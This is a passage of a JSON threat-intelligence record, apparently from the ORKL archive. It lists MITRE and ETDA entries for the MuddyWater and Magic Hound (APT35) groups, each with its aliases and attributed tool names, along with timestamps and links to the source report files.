                "TEMP.Zagros",
                "Mango Sandstorm",
                "TA450"
            ],
            "source_name": "MITRE:MuddyWater",
            "tools": [
                "STARWHALE",
                "POWERSTATS",
                "Out1",
                "PowerSploit",
                "Small Sieve",
                "Mori",
                "Mimikatz",
                "LaZagne",
                "PowGoop",
                "CrackMapExec",
                "ConnectWise",
                "SHARPSTATS",
                "RemoteUtilities",
                "Koadic"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "e3676dfe-3d40-4b3a-bfbd-4fc1f8c896f4",
            "created_at": "2022-10-25T15:50:23.808974Z",
            "updated_at": "2025-03-27T02:00:55.550912Z",
            "deleted_at": null,
            "main_name": "Magic Hound",
            "aliases": [
                "Magic Hound",
                "TA453",
                "COBALT ILLUSION",
                "Charming Kitten",
                "ITG18",
                "Phosphorus",
                "APT35",
                "Mint Sandstorm"
            ],
            "source_name": "MITRE:Magic Hound",
            "tools": [
                "Impacket",
                "CharmPower",
                "FRP",
                "Mimikatz",
                "Systeminfo",
                "ipconfig",
                "netsh",
                "PowerLess",
                "Pupy",
                "DownPaper",
                "PsExec",
                "Havij",
                "sqlmap"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "1699fb41-b83f-42ff-a6ec-984ae4a1031f",
            "created_at": "2022-10-25T16:07:23.83826Z",
            "updated_at": "2025-03-27T02:02:09.995863Z",
            "deleted_at": null,
            "main_name": "Magic Hound",
            "aliases": [
                "APT 35",
                "Ballistic Bobcat",
                "Charming Kitten",
                "CharmingCypress",
                "Cobalt Illusion",
                "Cobalt Mirage",
                "Educated Manticore",
                "Magic Hound",
                "Mint Sandstorm",
                "Operation BadBlood",
                "Operation Sponsoring Access",
                "Operation SpoofedScholars",
                "Operation Thamar Reservoir",
                "Phosphorus",
                "TA453",
                "TEMP.Beanie",
                "Tarh Andishan",
                "Timberworm",
                "TunnelVision",
                "UNC788",
                "Yellow Garuda"
            ],
            "source_name": "ETDA:Magic Hound",
            "tools": [
                "7-Zip",
                "AnvilEcho",
                "BASICSTAR",
                "CORRUPT KITTEN",
                "CWoolger",
                "CharmPower",
                "ChromeHistoryView",
                "CommandCam",
                "DistTrack",
                "DownPaper",
                "FRP",
                "Fast Reverse Proxy",
                "FireMalv",
                "Ghambar",
                "GoProxy",
                "GorjolEcho",
                "HYPERSCRAPE",
                "Havij",
                "MPK",
                "MPKBot",
                "Matryoshka",
                "Matryoshka RAT",
                "MediaPl",
                "Mimikatz",
                "MischiefTut",
                "NETWoolger",
                "NOKNOK",
                "PINEFLOWER",
                "POWERSTAR",
                "PowerLess Backdoor",
                "PsList",
                "Pupy",
                "PupyRAT",
                "SNAILPROXY",
                "Shamoon",
                "TDTESS",
                "WinRAR",
                "WoolenLogger",
                "Woolger",
                "pupy",
                "sqlmap"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "3c430d71-ab2b-4588-820a-42dd6cfc39fb",
            "created_at": "2022-10-25T16:07:23.880522Z",
            "updated_at": "2025-03-27T02:02:10.010443Z",
            "deleted_at": null,
            "main_name": "MuddyWater",
            "aliases": [
                "ATK 51",
                "Boggy Serpens",
                "Cobalt Ulster",
                "ITG17",
                "Mango Sandstorm",
                "MuddyWater",
                "Operation BlackWater",
                "Operation Earth Vetala",
                "Operation Quicksand",
                "Seedworm",
                "Static Kitten",
                "T-APT-14",
                "TA450",
                "TEMP.Zagros",
                "Yellow Nix"
            ],
            "source_name": "ETDA:MuddyWater",
            "tools": [
                "Agentemis",
                "BugSleep",
                "CLOUDSTATS",
                "ChromeCookiesView",
                "Cobalt Strike",
                "CobaltStrike",
                "CrackMapExec",
                "DELPHSTATS",
                "EmPyre",
                "EmpireProject",
                "FruityC2",
                "Koadic",
                "LOLBAS",
                "LOLBins",
                "LaZagne",
                "Living off the Land",
                "MZCookiesView",
                "Meterpreter",
                "Mimikatz",
                "MuddyC2Go",
                "MuddyRot",
                "Mudwater",
                "POWERSTATS",
                "PRB-Backdoor",
                "PhonyC2",
                "PowGoop",
                "PowerShell Empire",
                "PowerSploit",
                "Powermud",
                "QUADAGENT",
                "SHARPSTATS",
                "SSF",
                "Secure Socket Funneling",
                "Shootback",
                "Smbmap",
                "Valyria",
                "chrome-passwords",
                "cobeacon",
                "prb_backdoor"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535993,
    "ts_updated_at": 1743041774,
    "ts_creation_date": 1672273282,
    "ts_modification_date": 1672273282,
    "files": {
        "pdf": "https://archive.orkl.eu/56ec53ca944e207ca6d8a0a358925d4463d3c796.pdf",
        "text": "https://archive.orkl.eu/56ec53ca944e207ca6d8a0a358925d4463d3c796.txt",
        "img": "https://archive.orkl.eu/56ec53ca944e207ca6d8a0a358925d4463d3c796.jpg"
    }
}